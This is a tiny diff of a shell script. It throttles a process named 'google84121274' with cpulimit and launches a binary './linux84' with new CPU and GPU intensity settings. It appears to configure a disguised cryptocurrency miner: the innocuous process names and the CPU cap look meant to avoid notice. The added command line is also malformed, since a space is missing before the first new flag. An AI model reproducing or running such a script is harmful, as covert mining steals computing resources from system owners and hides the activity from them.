@@ -83,4 +83,4 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./linux84 --mode linux84
+./linux84 --mode linux84--cpu-intensity 98 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98
